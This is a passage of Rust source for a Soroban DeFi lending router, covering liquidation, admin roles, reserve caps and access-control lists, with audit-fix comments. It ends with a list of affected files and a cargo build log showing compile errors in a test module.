                     .ok_or(KineticRouterError::MathOverflow)?
             };
             if remaining_debt_value < MIN_LEFTOVER_BASE || remaining_collateral_value < MIN_LEFTOVER_BASE {
                 return Err(KineticRouterError::InvalidLiquidation);
             }
         }
 
         // Interest rate update: pass known scaled totals from callback (saves 2 scaled_total_supply calls)
         if collateral_asset == debt_asset {
             // Same asset: both a-token and debt-token totals known
             crate::calculation::update_interest_rates_and_store(
                 &env, &debt_asset, fresh_debt_reserve_data,
                 final_collateral_scaled_total, final_debt_scaled_total,
             )?;
         } else {
             // Debt reserve: debt_token total known, a_token unknown
             crate::calculation::update_interest_rates_and_store(
                 &env, &debt_asset, fresh_debt_reserve_data,
                 None, final_debt_scaled_total,
             )?;
             // Collateral reserve: a_token total known, debt_token unknown
             crate::calculation::update_interest_rates_and_store(
                 &env, &collateral_asset, fresh_collateral_reserve_data,
                 final_collateral_scaled_total, None,
             )?;
         }
 
         // Step 8: Clear authorization (prevents replay)
         storage::remove_liquidation_authorization(&env, &liquidator, &user);
 
         env.events().publish(
             (symbol_short!("exec_ok"),),
             auth.nonce,
         );
 
         Ok(())
     }
 
     /// Set treasury address for protocol fees (admin only)
     ///
     /// # Arguments
     /// * `treasury` - New treasury address for protocol fee collection
     ///
     /// # Returns
     /// * `Ok(())` if treasury updated successfully
     /// * `Err(Unauthorized)` if caller is not admin
     pub fn set_treasury(env: Env, treasury: Address) -> Result<(), KineticRouterError> {
         crate::params::set_treasury(env, treasury)
     }
 
     pub fn get_treasury(env: Env) -> Option<Address> {
         crate::params::get_treasury(env)
     }
 
     /// F-02
     /// Safety net for when oracle precision changes without changing the oracle address.
     pub fn flush_oracle_config_cache(env: Env) -> Result<(), KineticRouterError> {
         let admin = storage::get_pool_admin(&env)?;
         admin.require_auth();
         storage::flush_oracle_config_cache(&env);
         Ok(())
     }
 
     /// AC-01
     /// Must be called once after contract upgrade to prevent whitelist/blacklist bypass.
     pub fn sync_access_control_flags(env: Env) -> Result<(), KineticRouterError> {
         let admin = storage::get_pool_admin(&env)?;
         admin.require_auth();
         storage::sync_access_control_flags(&env);
         Ok(())
     }
 
     pub fn set_flash_liquidation_helper(env: Env, helper: Address) -> Result<(), KineticRouterError> {
         crate::params::set_flash_liquidation_helper(env, helper)
     }
 
     pub fn get_flash_liquidation_helper(env: Env) -> Option<Address> {
         crate::params::get_flash_liquidation_helper(env)
     }
 
     /// Set pool configurator contract address (admin only)
     ///
     /// # Arguments
     /// * `configurator` - Pool configurator contract address
     ///
     /// # Returns
     /// * `Ok(())` if configurator address updated successfully
     /// * `Err(Unauthorized)` if caller is not admin
     pub fn set_pool_configurator(env: Env, configurator: Address) -> Result<(), KineticRouterError> {
         crate::params::set_pool_configurator(env, configurator)
     }
 
     pub fn get_pool_configurator(env: Env) -> Option<Address> {
         crate::params::get_pool_configurator(env)
     }
 
     /// Get available protocol reserves for an asset
     ///
     /// Protocol reserves accumulate due to the reserve factor, which reduces supplier APY.
     /// Reserves = underlying_balance_in_atoken - total_withdrawable_supply
     ///
     /// # Arguments
     /// * `asset` - The address of the underlying asset
     ///
     /// # Returns
     /// * `Ok(u128)` - Available reserves in smallest units
     /// * `Err` - If reserve not found or calculation fails
     pub fn get_protocol_reserves(env: Env, asset: Address) -> Result<u128, KineticRouterError> {
         crate::views::get_protocol_reserves(env, asset)
     }
 
     pub fn collect_protocol_reserves(env: Env, asset: Address) -> Result<u128, KineticRouterError> {
         let _guard = acquire_reentrancy_guard(&env);
         crate::treasury::collect_protocol_reserves(env.clone(), asset)
     }
 
     /// Cover accumulated bad debt deficit for a reserve.
     /// Permissionless: anyone can inject tokens to replenish pool liquidity.
     /// Returns the actual amount covered (capped at current deficit).
     pub fn cover_deficit(
         env: Env,
         caller: Address,
         asset: Address,
         amount: u128,
     ) -> Result<u128, KineticRouterError> {
         let _guard = acquire_reentrancy_guard(&env);
         crate::treasury::cover_deficit(env.clone(), caller, asset, amount)
     }
 
     /// Get accumulated bad debt deficit for a reserve (0 if none).
     pub fn get_reserve_deficit(env: Env, asset: Address) -> u128 {
         storage::get_reserve_deficit(&env, &asset)
     }
 
     pub fn set_user_use_reserve_as_coll(
         env: Env,
         caller: Address,
         asset: Address,
         use_as_collateral: bool,
     ) -> Result<(), KineticRouterError> {
         // F-04
         storage::extend_instance_ttl(&env);
         // Require caller authentication to prevent unauthorized collateral changes
         caller.require_auth();
         // LOW-001: Whitelist + blacklist must both be checked, matching all other user-facing ops
         validation::validate_reserve_whitelist_access(&env, &asset, &caller)?;
         validation::validate_reserve_blacklist_access(&env, &asset, &caller)?;
 
         // Validate reserve exists and is active
         let reserve_data = storage::get_reserve_data(&env, &asset)?;
         if !reserve_data.configuration.is_active() {
             return Err(KineticRouterError::AssetNotActive);
         }
 
         if use_as_collateral {
             crate::price::verify_oracle_price_exists_and_nonzero(&env, &asset)?;
 
             let mut user_config = storage::get_user_configuration(&env, &caller);
             user_config.set_using_as_collateral(k2_shared::safe_reserve_id(&env, reserve_data.id), true);
             storage::set_user_configuration(&env, &caller, &user_config);
         } else {
             // C-02
             // factor calculation reflects the post-toggle state (asset no longer
             // counted as collateral).  If HF is too low, revert the toggle.
             let mut user_config = storage::get_user_configuration(&env, &caller);
             user_config.set_using_as_collateral(k2_shared::safe_reserve_id(&env, reserve_data.id), false);
             storage::set_user_configuration(&env, &caller, &user_config);
 
             let user_account_data = crate::calculation::calculate_user_account_data(&env, &caller)?;
             if user_account_data.health_factor < 1_000_000_000_000_000_000 {
                 // Revert the toggle -- position would become under-collateralized
                 user_config.set_using_as_collateral(k2_shared::safe_reserve_id(&env, reserve_data.id), true);
                 storage::set_user_configuration(&env, &caller, &user_config);
                 return Err(KineticRouterError::InvalidLiquidation);
             }
         }
 
         env.events().publish(
             (symbol_short!("coll"), caller.clone(), asset.clone()),
             use_as_collateral,
         );
 
         Ok(())
     }
 
     /// Get user account data
     ///
     /// # Arguments
     /// * `user` - The address of the user
     pub fn get_user_account_data(
         env: Env,
         user: Address,
     ) -> Result<UserAccountData, KineticRouterError> {
         crate::views::get_user_account_data(env, user)
     }
 
     pub fn get_reserve_data(env: Env, asset: Address) -> Result<ReserveData, KineticRouterError> {
         crate::views::get_reserve_data(env, asset)
     }
 
     pub fn get_current_reserve_data(
         env: Env,
         asset: Address,
     ) -> Result<ReserveData, KineticRouterError> {
         crate::views::get_current_reserve_data(env, asset)
     }
 
     pub fn get_current_liquidity_index(
         env: Env,
         asset: Address,
     ) -> Result<u128, KineticRouterError> {
         crate::views::get_current_liquidity_index(env, asset)
     }
 
     pub fn get_current_var_borrow_idx(
         env: Env,
         asset: Address,
     ) -> Result<u128, KineticRouterError> {
         crate::views::get_current_var_borrow_idx(env, asset)
     }
 
     /// Get incentives contract address
     ///
     /// # Arguments
     /// * `env` - The Soroban environment
     ///
     /// # Returns
     /// * `Option<Address>` - The incentives contract address if set, None otherwise
     pub fn get_incentives_contract(env: Env) -> Option<Address> {
         crate::params::get_incentives_contract(env)
     }
 
     pub fn set_incentives_contract(env: Env, incentives: Address) -> Result<u32, KineticRouterError> {
         crate::params::set_incentives_contract(env, incentives)
     }
 
     /// Get user configuration
     ///
     /// # Arguments
     /// * `user` - The address of the user
     pub fn get_user_configuration(env: Env, user: Address) -> UserConfiguration {
         crate::views::get_user_configuration(env, user)
     }
 
     pub fn get_reserves_list(env: Env) -> Vec<Address> {
         crate::views::get_reserves_list(env)
     }
 
     /// L-02
     pub fn update_reserve_state(
         env: Env,
         asset: Address,
     ) -> Result<ReserveData, KineticRouterError> {
         crate::views::update_reserve_state(env, asset)
     }
 
 
     pub fn is_paused(env: Env) -> bool {
         crate::views::is_paused(env)
     }
 
     pub fn pause(env: Env, caller: Address) -> Result<(), KineticRouterError> {
         crate::emergency::pause(env, caller)
     }
 
     pub fn unpause(env: Env, caller: Address) -> Result<(), KineticRouterError> {
         crate::emergency::unpause(env, caller)
     }
 
     /// Initialize a new reserve
     ///
     /// # Note
     /// This function should be called by the pool configurator contract.
     /// The pool configurator should validate authorization before calling this function.
     ///
     /// # Arguments
     /// * `underlying_asset` - The address of the underlying asset
     /// * `a_token_impl` - The address of the aToken implementation
     /// * `variable_debt_impl` - The address of the variable debt token implementation
     /// * `interest_rate_strategy` - The address of the interest rate strategy
     /// * `treasury` - The address of the treasury
     /// * `params` - Reserve initialization parameters
     pub fn init_reserve(
         env: Env,
         caller: Address,
         underlying_asset: Address,
         a_token_impl: Address,
         variable_debt_impl: Address,
         interest_rate_strategy: Address,
         _treasury: Address,
         params: InitReserveParams,
     ) -> Result<(), KineticRouterError> {
         crate::reserve::init_reserve(
             env,
             caller,
             underlying_asset,
             a_token_impl,
             variable_debt_impl,
             interest_rate_strategy,
             _treasury,
             params,
         )
     }
 
 
     /// Updates the supply cap for a reserve.
     ///
     /// The supply cap limits the total amount that can be supplied to a reserve.
     /// Caps are stored as whole tokens (not smallest units) to maximize the
     /// effective range within the 32-bit storage limit.
     ///
     /// # Arguments
     /// - `env`: The Soroban environment
     /// - `asset`: The underlying asset address
     /// - `supply_cap`: New supply cap in whole tokens (0 = no cap, virtually unlimited)
     ///
     /// # Returns
     /// - `Ok(())`: Supply cap updated successfully
     /// - `Err(KineticRouterError::InvalidAmount)`: Invalid cap value
     /// - `Err(KineticRouterError::Unauthorized)`: Caller is not admin
     ///
     /// # Events
     /// Emits `(sup_cap, asset)` event with the new supply cap value.
     pub fn set_reserve_supply_cap(
         env: Env,
         asset: Address,
         supply_cap: u128,
     ) -> Result<(), KineticRouterError> {
         crate::reserve::set_reserve_supply_cap(env, asset, supply_cap)
     }
 
     /// Updates the borrow cap for a reserve.
     ///
     /// The borrow cap limits the total amount that can be borrowed from a reserve.
     /// Caps are stored as whole tokens (not smallest units) to maximize the
     /// effective range within the 32-bit storage limit.
     ///
     /// # Arguments
     /// - `env`: The Soroban environment
     /// - `asset`: The underlying asset address
     /// - `borrow_cap`: New borrow cap in whole tokens (0 = no cap, virtually unlimited)
     ///
     /// # Returns
     /// - `Ok(())`: Borrow cap updated successfully
     /// - `Err(KineticRouterError::InvalidAmount)`: Invalid cap value
     /// - `Err(KineticRouterError::Unauthorized)`: Caller is not admin
     ///
     /// # Events
     /// Emits `(bor_cap, asset)` event with the new borrow cap value.
     pub fn set_reserve_borrow_cap(
         env: Env,
         asset: Address,
         borrow_cap: u128,
     ) -> Result<(), KineticRouterError> {
         crate::reserve::set_reserve_borrow_cap(env, asset, borrow_cap)
     }
 
     /// Sets the minimum remaining debt after partial liquidation for a reserve.
     /// Value is in whole tokens (same convention as borrow/supply caps).
     /// Prevents dust debt positions that are uneconomical to liquidate.
     pub fn set_reserve_min_remaining_debt(
         env: Env,
         asset: Address,
         min_remaining_debt: u32,
     ) -> Result<(), KineticRouterError> {
         crate::reserve::set_reserve_min_remaining_debt(env, asset, min_remaining_debt)
     }
 
     /// Updates the debt ceiling for a reserve.
     ///
     /// The debt ceiling limits the total amount of debt that can be borrowed across
     /// all users for a specific reserve. This is different from borrow cap which limits
     /// per-reserve borrowing. Debt ceiling is stored as whole tokens (not smallest units).
     ///
     /// # Arguments
     /// - `env`: The Soroban environment
     /// - `asset`: The underlying asset address
     /// - `debt_ceiling`: New debt ceiling in whole tokens (0 = no ceiling)
     ///
     /// # Returns
     /// - `Ok(())`: Debt ceiling updated successfully
     /// - `Err(KineticRouterError::ReserveNotFound)`: Reserve does not exist
     /// - `Err(KineticRouterError::Unauthorized)`: Caller is not admin
     ///
     /// # Events
     /// Emits `(set_cap, asset)` event with `(debt_ceil, debt_ceiling)` value.
     pub fn set_reserve_debt_ceiling(
         env: Env,
         asset: Address,
         debt_ceiling: u128,
     ) -> Result<(), KineticRouterError> {
         crate::reserve::set_reserve_debt_ceiling(env, asset, debt_ceiling)
     }
 
     /// Gets the debt ceiling for a reserve.
     ///
     /// # Arguments
     /// - `asset`: The underlying asset address
     ///
     /// # Returns
     /// - `Ok(u128)`: Debt ceiling in whole tokens (0 = no ceiling)
     /// - `Err(KineticRouterError::ReserveNotFound)`: Reserve does not exist
     pub fn get_reserve_debt_ceiling(
         env: Env,
         asset: Address,
     ) -> Result<u128, KineticRouterError> {
         crate::reserve::get_reserve_debt_ceiling(env, asset)
     }
 
     /// Update reserve configuration (called by pool configurator)
     ///
     /// # Arguments
     /// - `caller`: The address calling this function (must be pool configurator)
     /// - `asset`: The underlying asset address
     /// - `configuration`: New reserve configuration
     pub fn update_reserve_configuration(
         env: Env,
         caller: Address,
         asset: Address,
         configuration: ReserveConfiguration,
     ) -> Result<(), KineticRouterError> {
         crate::reserve::update_reserve_configuration(env, caller, asset, configuration)
     }
 
     pub fn update_reserve_rate_strategy(
         env: Env,
         caller: Address,
         asset: Address,
         interest_rate_strategy: Address,
     ) -> Result<(), KineticRouterError> {
         crate::reserve::update_reserve_rate_strategy(env, caller, asset, interest_rate_strategy)
     }
 
     pub fn update_atoken_implementation(
         env: Env,
         caller: Address,
         asset: Address,
         a_token_impl: BytesN<32>,
     ) -> Result<(), KineticRouterError> {
         crate::reserve::update_atoken_implementation(env, caller, asset, a_token_impl)
     }
 
     pub fn update_debt_token_implementation(
         env: Env,
         caller: Address,
         asset: Address,
         debt_token_impl: BytesN<32>,
     ) -> Result<(), KineticRouterError> {
         crate::reserve::update_debt_token_implementation(env, caller, asset, debt_token_impl)
     }
 
     pub fn drop_reserve(
         env: Env,
         caller: Address,
         asset: Address,
     ) -> Result<(), KineticRouterError> {
         crate::reserve::drop_reserve(env, caller, asset)
     }
 
     /// Upgrade contract WASM (admin only)
     ///
     /// # Arguments
     /// * `new_wasm_hash` - Hash of new WASM binary
     ///
     /// # Errors
     /// * `Unauthorized` - Caller is not admin
     pub fn upgrade(env: Env, new_wasm_hash: BytesN<32>) -> Result<(), KineticRouterError> {
         crate::upgrade::upgrade(env, new_wasm_hash).map_err(|_| KineticRouterError::Unauthorized)
     }
 
     pub fn version(_env: Env) -> u32 {
         crate::upgrade::version()
     }
 
     pub fn get_admin(env: Env) -> Result<Address, KineticRouterError> {
         crate::upgrade::get_admin(&env).map_err(|_| KineticRouterError::Unauthorized)
     }
 
     /// Propose a new upgrade admin address (two-step transfer, step 1).
     /// Only the current admin can propose a new admin.
     /// The proposed admin must call `accept_admin` to complete the transfer.
     pub fn propose_admin(
         env: Env,
         caller: Address,
         pending_admin: Address,
     ) -> Result<(), KineticRouterError> {
         use k2_shared::upgradeable::admin;
         admin::propose_admin(&env, &caller, &pending_admin)
             .map_err(|e| match e {
                 k2_shared::upgradeable::UpgradeError::Unauthorized => KineticRouterError::Unauthorized,
                 k2_shared::upgradeable::UpgradeError::NoPendingAdmin => KineticRouterError::NoPendingAdmin,
                 k2_shared::upgradeable::UpgradeError::InvalidPendingAdmin => KineticRouterError::InvalidPendingAdmin,
                 _ => KineticRouterError::Unauthorized,
             })
     }
 
     /// Accept upgrade admin role (two-step transfer, step 2).
     /// Only the pending admin can call this to finalize the transfer.
     pub fn accept_admin(env: Env, caller: Address) -> Result<(), KineticRouterError> {
         use k2_shared::upgradeable::admin;
         admin::accept_admin(&env, &caller)
             .map_err(|e| match e {
                 k2_shared::upgradeable::UpgradeError::NoPendingAdmin => KineticRouterError::NoPendingAdmin,
                 k2_shared::upgradeable::UpgradeError::InvalidPendingAdmin => KineticRouterError::InvalidPendingAdmin,
                 _ => KineticRouterError::Unauthorized,
             })
     }
 
     /// Cancel a pending upgrade admin proposal.
     /// Only the current admin can cancel a pending proposal.
     pub fn cancel_admin_proposal(env: Env, caller: Address) -> Result<(), KineticRouterError> {
         use k2_shared::upgradeable::admin;
         admin::cancel_admin_proposal(&env, &caller)
             .map_err(|e| match e {
                 k2_shared::upgradeable::UpgradeError::Unauthorized => KineticRouterError::Unauthorized,
                 k2_shared::upgradeable::UpgradeError::NoPendingAdmin => KineticRouterError::NoPendingAdmin,
                 _ => KineticRouterError::Unauthorized,
             })
     }
 
     /// Get the pending upgrade admin address, if any.
     pub fn get_pending_admin(env: Env) -> Result<Address, KineticRouterError> {
         use k2_shared::upgradeable::admin;
         admin::get_pending_admin(&env)
             .map_err(|_| KineticRouterError::NoPendingAdmin)
     }
 
     /// Propose a new pool admin address (two-step transfer, step 1).
     pub fn propose_pool_admin(
         env: Env,
         caller: Address,
         pending_admin: Address,
     ) -> Result<(), KineticRouterError> {
         propose_role_admin(
             &env, &caller, &pending_admin,
             storage::get_pending_pool_admin,
             storage::set_pending_pool_admin,
             soroban_sdk::symbol_short!("pool_admc"),
             soroban_sdk::symbol_short!("pool_admp"),
         )
     }
 
     /// Accept pool admin role (two-step transfer, step 2).
     pub fn accept_pool_admin(env: Env, caller: Address) -> Result<(), KineticRouterError> {
         let pending = storage::get_pending_pool_admin(&env)?;
         let previous = storage::get_pool_admin(&env)?;
         accept_role_admin(
             &env, &caller, &pending, &previous,
             storage::set_pool_admin,
             storage::clear_pending_pool_admin,
             soroban_sdk::symbol_short!("pool_adma"),
         )
     }
 
     /// Cancel a pending pool admin proposal.
     pub fn cancel_pool_admin_proposal(env: Env, caller: Address) -> Result<(), KineticRouterError> {
         cancel_role_admin(
             &env, &caller,
             storage::get_pending_pool_admin,
             storage::clear_pending_pool_admin,
             soroban_sdk::symbol_short!("pool_admc"),
         )
     }
 
     /// Get the pending pool admin address, if any.
     pub fn get_pending_pool_admin(env: Env) -> Result<Address, KineticRouterError> {
         storage::get_pending_pool_admin(&env)
     }
 
     /// Propose a new emergency admin address (two-step transfer, step 1).
     pub fn propose_emergency_admin(
         env: Env,
         caller: Address,
         pending_admin: Address,
     ) -> Result<(), KineticRouterError> {
         propose_role_admin(
             &env, &caller, &pending_admin,
             storage::get_pending_emergency_admin,
             storage::set_pending_emergency_admin,
             soroban_sdk::symbol_short!("emrg_admc"),
             soroban_sdk::symbol_short!("emrg_admp"),
         )
     }
 
     /// Accept emergency admin role (two-step transfer, step 2).
     pub fn accept_emergency_admin(env: Env, caller: Address) -> Result<(), KineticRouterError> {
         let pending = storage::get_pending_emergency_admin(&env)?;
         let previous_admin = storage::get_emergency_admin(&env);
         let prev = previous_admin.unwrap_or_else(|| {
             storage::get_pool_admin(&env).unwrap_or_else(|_| {
                 panic_with_error!(&env, KineticRouterError::NotInitialized)
             })
         });
         accept_role_admin(
             &env, &caller, &pending, &prev,
             storage::set_emergency_admin,
             storage::clear_pending_emergency_admin,
             soroban_sdk::symbol_short!("emrg_adma"),
         )
     }
 
     /// Cancel a pending emergency admin proposal.
     pub fn cancel_emergency_admin_proposal(env: Env, caller: Address) -> Result<(), KineticRouterError> {
         cancel_role_admin(
             &env, &caller,
             storage::get_pending_emergency_admin,
             storage::clear_pending_emergency_admin,
             soroban_sdk::symbol_short!("emrg_admc"),
         )
     }
 
     /// Get the pending emergency admin address, if any.
     pub fn get_pending_emergency_admin(env: Env) -> Result<Address, KineticRouterError> {
         storage::get_pending_emergency_admin(&env)
     }
 
     /// Set reserve whitelist (admin only)
     ///
     /// # Arguments
     /// * `caller` - Pool admin address
     /// * `asset` - Underlying asset address
     /// * `whitelist` - Addresses allowed to interact with this reserve
     ///
     /// # Behavior
     /// * Empty whitelist: open access
     /// * Non-empty whitelist: restricted to listed addresses
     ///
     /// ** Note **: This function replaces the entire whitelist. To add/remove addresses,
     /// first get the current list, modify it, then set the complete new list.
     ///
     /// # Errors
     /// * `Unauthorized` - Caller is not admin
     pub fn set_reserve_whitelist(
         env: Env,
         asset: Address,
         whitelist: Vec<Address>,
     ) -> Result<(), KineticRouterError> {
         crate::access_control::set_reserve_whitelist(env, asset, whitelist)
     }
 
     pub fn get_reserve_whitelist(env: Env, asset: Address) -> Vec<Address> {
         crate::access_control::get_reserve_whitelist(env, asset)
     }
 
     pub fn is_whitelisted_for_reserve(env: Env, asset: Address, address: Address) -> bool {
         crate::access_control::is_whitelisted_for_reserve(env, asset, address)
     }
 
     pub fn set_liquidation_whitelist(
         env: Env,
         whitelist: Vec<Address>,
     ) -> Result<(), KineticRouterError> {
         crate::access_control::set_liquidation_whitelist(env, whitelist)
     }
 
     pub fn get_liquidation_whitelist(env: Env) -> Vec<Address> {
         crate::access_control::get_liquidation_whitelist(env)
     }
 
     pub fn is_whitelisted_for_liquidation(env: Env, address: Address) -> bool {
         crate::access_control::is_whitelisted_for_liquidation(env, address)
     }
 
     pub fn set_reserve_blacklist(
         env: Env,
         asset: Address,
         blacklist: Vec<Address>,
     ) -> Result<(), KineticRouterError> {
         crate::access_control::set_reserve_blacklist(env, asset, blacklist)
     }
 
     pub fn get_reserve_blacklist(env: Env, asset: Address) -> Vec<Address> {
         crate::access_control::get_reserve_blacklist(env, asset)
     }
 
     pub fn is_blacklisted_for_reserve(env: Env, asset: Address, address: Address) -> bool {
         crate::access_control::is_blacklisted_for_reserve(env, asset, address)
     }
 
     pub fn set_liquidation_blacklist(
         env: Env,
         blacklist: Vec<Address>,
     ) -> Result<(), KineticRouterError> {
         crate::access_control::set_liquidation_blacklist(env, blacklist)
     }
 
     pub fn get_liquidation_blacklist(env: Env) -> Vec<Address> {
         crate::access_control::get_liquidation_blacklist(env)
     }
 
     pub fn is_blacklisted_for_liquidation(env: Env, address: Address) -> bool {
         crate::access_control::is_blacklisted_for_liquidation(env, address)
     }
 
     /// M-01
     /// Only whitelisted handlers can be used for custom swaps.
     /// Empty whitelist = deny all custom handlers (only built-in DEX).
     pub fn set_swap_handler_whitelist(
         env: Env,
         whitelist: Vec<Address>,
     ) -> Result<(), KineticRouterError> {
         crate::access_control::set_swap_handler_whitelist(env, whitelist)
     }
 
     pub fn get_swap_handler_whitelist(env: Env) -> Vec<Address> {
         crate::access_control::get_swap_handler_whitelist(env)
     }
 
     pub fn is_swap_handler_whitelisted(env: Env, handler: Address) -> bool {
         crate::access_control::is_swap_handler_whitelisted(env, handler)
     }
 
     /// WP-C1 + MEDIUM-1 fix: Validate sender HF and update bitmaps for aToken transfers.
     /// Called by aToken.transfer_internal() after computing balances but before writing them.
     /// Single cross-contract call replaces separate validate + finalize to save router size.
     ///
     /// 1. HF check: if sender has debt, validate the transfer won't make them liquidatable
     /// 2. Bitmap sync: clear sender's collateral bit if balance → 0, set receiver's if new position
     pub fn validate_and_finalize_transfer(
         env: Env,
         underlying_asset: Address,
         from: Address,
         to: Address,
         amount: u128,
         from_balance_after: u128,
         to_balance_after: u128,
     ) -> Result<(), KineticRouterError> {
         let reserve_data = storage::get_reserve_data(&env, &underlying_asset)?;
         let reserve_id = k2_shared::safe_reserve_id(&env, reserve_data.id);
 
         // Caller must be the aToken contract for this reserve.
         // In the legitimate flow, the aToken invokes this function via
         // env.try_invoke_contract, so require_auth() succeeds. Any other
         // caller (EOA or unrelated contract) will fail this check.
         reserve_data.a_token_address.require_auth();
 
         // --- HF validation (WP-C1) ---
         let mut from_config = storage::get_user_configuration(&env, &from);
         if from_config.has_any_borrowing() {
             let reserve_data = crate::calculation::update_state_without_store(&env, &reserve_data)?;
             let oracle_config = crate::price::get_oracle_config(&env)?;
             let oracle_to_wad = k2_shared::calculate_oracle_to_wad_factor(oracle_config.price_precision);
             validation::validate_user_can_withdraw(&env, &from, &underlying_asset, amount, &reserve_data, oracle_to_wad)?;
         }
 
         // --- Bitmap sync (MEDIUM-1 fix) ---
         // Sender: clear collateral bit if balance is now zero
         if from_balance_after == 0 {
             from_config.set_using_as_collateral(reserve_id, false);
             storage::set_user_configuration(&env, &from, &from_config);
         }
 
         // Receiver: set collateral bit if they now have a position
         if to_balance_after > 0 {
             let mut to_config = storage::get_user_configuration(&env, &to);
             if !to_config.is_using_as_collateral(reserve_id) {
                 let active_count = to_config.count_active_reserves();
                 if active_count >= storage::MAX_USER_RESERVES {
                     panic_with_error!(&env, k2_shared::UserReserveError::MaxUserReservesExceeded);
                 }
                 to_config.set_using_as_collateral(reserve_id, true);
                 storage::set_user_configuration(&env, &to, &to_config);
             }
         }
 
         Ok(())
     }
 }
```

### Affected Files
- `contracts/kinetic-router/src/liquidation.rs`
- `contracts/kinetic-router/src/router.rs`

### Validation Output

```
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/kinetic-router/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/a-token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/debt-token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/interest-rate-strategy/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/price-oracle/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/pool-configurator/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/liquidation-engine/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/incentives/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/treasury/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/flash-liquidation-helper/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/aquarius-swap-adapter/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/soroswap-swap-adapter/Cargo.toml
workspace: /repo/Cargo.toml
warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/shared/src/upgradeable.rs:67:26
   |
67 |             env.events().publish(
   |                          ^^^^^^^
   |
   = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/shared/src/upgradeable.rs:81:22
   |
81 |         env.events().publish(
   |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/shared/src/upgradeable.rs:107:22
    |
107 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/shared/src/upgradeable.rs:129:22
    |
129 |         env.events().publish(
    |                      ^^^^^^^

warning: unused variable: `reported_amount_out`
   --> contracts/shared/src/dex.rs:416:9
    |
416 |     let reported_amount_out: u128 = call_soroswap(
    |         ^^^^^^^^^^^^^^^^^^^ help: if this is intentional, prefix it with an underscore: `_reported_amount_out`
    |
    = note: `#[warn(unused_variables)]` (part of `#[warn(unused)]`) on by default

warning: `k2-shared` (lib) generated 5 warnings (run `cargo fix --lib -p k2-shared` to apply 1 suggestion)
   Compiling k2_token v0.1.0 (/repo/contracts/token)
error[E0432]: unresolved import `k2_a_token`
 --> contracts/token/src/test.rs:3:5
  |
3 | use k2_a_token::{ATokenContract, ATokenContractClient};
  |     ^^^^^^^^^^ use of unresolved module or unlinked crate `k2_a_token`
  |
  = help: if you wanted to use a crate named `k2_a_token`, use `cargo add k2_a_token` to add it to your `Cargo.toml`

error[E0432]: unresolved import `k2_debt_token`
 --> contracts/token/src/test.rs:4:5
  |
4 | use k2_debt_token::{DebtTokenContract, DebtTokenContractClient};
  |     ^^^^^^^^^^^^^ use of unresolved module or unlinked crate `k2_debt_token`
  |
  = help: if you wanted to use a crate named `k2_debt_token`, use `cargo add k2_debt_token` to add it to your `Cargo.toml`

error[E0432]: unresolved import `k2_incentives`
 --> contracts/token/src/test.rs:5:5
  |
5 | use k2_incentives::{IncentivesContract, IncentivesContractClient};
  |     ^^^^^^^^^^^^^ use of unresolved module or unlinked crate `k2_incentives`
  |
  = help: if you wanted to use a crate named `k2_incentives`, use `cargo add k2_incentives` to add it to your `Cargo.toml`

error[E0432]: unresolved import `k2_interest_rate_strategy`
 --> contracts/token/src/test.rs:6:5
  |
6 | use k2_interest_rate_strategy::{InterestRateStrategyContract, InterestRateStrategyContractClient};
  |     ^^^^^^^^^^^^^^^^^^^^^^^^^ use of unresolved module or unlinked crate `k2_interest_rate_strategy`
  |
  = help: if you wanted to use a crate named `k2_interest_rate_strategy`, use `cargo add k2_interest_rate_strategy` to add it to your `Cargo.toml`

error[E0432]: unresolved import `k2_kinetic_router`
 --> contracts/token/src/test.rs:7:5
  |
7 | use k2_kinetic_router::{KineticRouterContract, KineticRouterContractClient};
  |     ^^^^^^^^^^^^^^^^^ use of unresolved module or unlinked crate `k2_kinetic_router`
  |
  = help: if you wanted to use a crate named `k2_kinetic_router`, use `cargo add k2_kinetic_router` to add it to your `Cargo.toml`

error[E0432]: unresolved import `k2_pool_configurator`
 --> contracts/token/src/test.rs:8:5
  |
8 | use k2_pool_configurator::{PoolConfiguratorContract, PoolConfiguratorContractClient};
  |     ^^^^^^^^^^^^^^^^^^^^ use of unresolved module or unlinked crate `k2_pool_configurator`
  |
  = help: if you wanted to use a crate named `k2_pool_configurator`, use `cargo add k2_pool_configurator` to add it to your `Cargo.toml`

error[E0432]: unresolved import `k2_price_oracle`
 --> contracts/token/src/test.rs:9:5
  |
9 | use k2_price_oracle::{PriceOracleContract, PriceOracleContractClient};
  |     ^^^^^^^^^^^^^^^ use of unresolved module or unlinked crate `k2_price_oracle`
  |
